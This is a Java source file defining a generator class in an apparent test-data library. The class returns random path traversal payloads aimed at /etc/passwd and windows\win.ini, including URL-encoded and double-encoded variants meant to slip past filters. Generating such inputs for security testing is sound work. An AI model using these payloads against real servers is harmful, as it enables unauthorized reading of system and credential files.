package com.dataforge.generators.security;

import com.dataforge.core.DataGenerator;
import com.dataforge.core.GenerationContext;

import java.util.Random;

/**
 * Path traversal payload generator for generating common path traversal attacks.
 */
public class PathTraversalGenerator implements DataGenerator<String> {
    
    // Common path traversal payloads
    private static final String[] UNIX_PAYLOADS = {
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5C..%5Cetc%5Cpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "%252e%252e%255c%252e%252e%255c%252e%252e%255cetc%255cpasswd"
    };
    
    private static final String[] WINDOWS_PAYLOADS = {
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
        "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
    };
    
    // OS types
    public enum OSType {
        UNIX, WINDOWS, GENERIC
    }
    
    private final OSType osType;
    private final boolean urlEncoded;
    
    public PathTraversalGenerator() {
        this(OSType.GENERIC, false);
    }
    
    public PathTraversalGenerator(OSType osType, boolean urlEncoded) {
        this.osType = osType;
        this.urlEncoded = urlEncoded;
    }
    
    @Override
    public String generate(GenerationContext context) {
        Random random = context.getRandom();
        String payload;
        
        switch (osType) {
            case UNIX:
                payload = UNIX_PAYLOADS[random.nextInt(UNIX_PAYLOADS.length)];
                break;
            case WINDOWS:
                payload = WINDOWS_PAYLOADS[random.nextInt(WINDOWS_PAYLOADS.length)];
                break;
            case GENERIC:
            default:
                // Randomly select between Unix and Windows payloads
                if (random.nextBoolean()) {
                    payload = UNIX_PAYLOADS[random.nextInt(UNIX_PAYLOADS.length)];
                } else {
                    payload = WINDOWS_PAYLOADS[random.nextInt(WINDOWS_PAYLOADS.length)];
                }
                break;
        }
        
        // URL encode if requested
        if (urlEncoded) {
            return urlEncode(payload);
        }
        
        return payload;
    }
    
    /**
     * URL encode a string
     */
    private String urlEncode(String input) {
        StringBuilder encoded = new StringBuilder();
        for (char c : input.toCharArray()) {
            if (c == ' ') {
                encoded.append("%20");
            } else if (c == '/') {
                encoded.append("%2F");
            } else if (c == '\\') {
                encoded.append("%5C");
            } else if (c == '.') {
                encoded.append("%2E");
            } else {
                encoded.append(c);
            }
        }
        return encoded.toString();
    }
}